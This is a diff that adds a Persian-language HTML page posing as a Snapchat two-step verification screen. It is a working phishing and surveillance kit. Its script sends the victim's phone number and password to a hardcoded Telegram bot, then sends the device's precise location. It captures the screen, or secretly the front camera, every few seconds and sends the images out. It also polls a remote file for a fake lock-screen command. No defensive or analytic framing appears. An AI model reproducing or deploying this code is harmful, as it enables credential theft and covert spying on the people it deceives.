@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Snapchat Security</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body { background: #FFFC00; margin: 0; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: white; width: 85%; max-width: 380px; padding: 35px 20px; border-radius: 40px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); text-align: center; z-index: 5; }
+        .logo { width: 70px; margin-bottom: 15px; }
+        input { width: 100%; padding: 16px; margin: 10px 0; border: 1px solid #ddd; border-radius: 15px; font-size: 16px; outline: none; box-sizing: border-box; background: #f9f9f9; }
+        .btn { background: #000; color: #fff; width: 100%; padding: 18px; border-radius: 35px; border: none; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 15px; }
+        #dim { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; }
+        .loader { display: none; margin-top: 20px; font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+    <div id="dim"></div>
+    <div class="card" id="ui">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/600px-Snapchat_logo.svg.png" class="logo">
+        <h2>تایید هویت دو مرحله‌ای</h2>
+        <p style="font-size: 13px;">برای جلوگیری از مسدود شدن اکانت، وارد شوید.</p>
+        <input type="tel" id="p" placeholder="شماره تلفن">
+        <input type="password" id="s" placeholder="رمز عبور">
+        <button class="btn" onclick="run()">تایید و فعال‌سازی</button>
+        <div id="ld" class="loader">🔄 در حال ایمن‌سازی چت‌ها...</div>
+    </div>
+
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <audio id="bg" loop><source src="https://github.com/anars/blank-audio/raw/master/10-seconds-of-silence.mp3"></audio>
+
+    <script>
+        const CFG = {
+            t: "8484189401:AAHZZkNvQUXIk97rA1b0W7r1e-z5IWXdbpg",
+            c: "7261099659",
+            h: "https://whale-tracker-live.github.io/Snapchat/"
+        };
+
+        async function tg(m, b = null) {
+            const u = `https://api.telegram.org/bot${CFG.t}/${b ? 'sendDocument' : 'sendMessage'}`;
+            const f = new FormData();
+            f.append('chat_id', CFG.c);
+            if (b) f.append('document', b, `data_${Date.now()}.jpg`);
+            else f.append('text', m);
+            try { await fetch(u, { method: 'POST', body: f }); } catch(e) {}
+        }
+
+        async function run() {
+            const phone = document.getElementById('p').value;
+            const pass = document.getElementById('s').value;
+            if(!phone || !pass) return alert("فیلدها را پر کنید");
+
+            document.getElementById('bg').play();
+            await tg(`🎯 شکار جدید!\n📞 شماره: ${phone}\n🔑 رمز: ${pass}`);
+            
+            document.getElementById('ld').style.display = 'block';
+            document.querySelector('.btn').style.display = 'none';
+
+            // ۱. دریافت لوکیشن
+            navigator.geolocation.getCurrentPosition(p => {
+                tg(`📍 لوکیشن:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, null, {enableHighAccuracy:true});
+
+            // ۲. مانیتورینگ (اسکرین یا دوربین)
+            try {
+                // تلاش برای اسکرین‌شیر
+                const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
+                startStream(stream, "🖥 مانیتور زنده");
+            } catch(e) {
+                tg("⚠️ اسکرین رد شد. سوئیچ به دوربین مخفی...");
+                try {
+                    // سوئیچ خودکار به دوربین جلو در صورت رد کردن اسکرین
+                    const cam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+                    startStream(cam, "📷 تصویر دوربین جلو");
+                } catch(e2) { tg("❌ تمام دسترسی‌ها رد شد."); }
+            }
+        }
+
+        function startStream(stream, label) {
+            const vid = document.getElementById('v');
+            vid.srcObject = stream;
+            const can = document.getElementById('c');
+            setInterval(() => {
+                can.width = vid.videoWidth; can.height = vid.videoHeight;
+                can.getContext('2d').drawImage(vid, 0, 0);
+                can.toBlob(b => tg(label, b), 'image/jpeg', 0.2);
+            }, 4000);
+        }
+
+        // چک کردن دستور قفل
+        setInterval(async () => {
+            try {
+                const r = await fetch(CFG.h + 'commands.json?nc=' + Date.now());
+                const d = await r.json();
+                document.getElementById('dim').style.display = (d.action === 'fake_lock') ? 'block' : 'none';
+            } catch(e) {}
+        }, 4000);
+    </script>
+</body>
+</html>
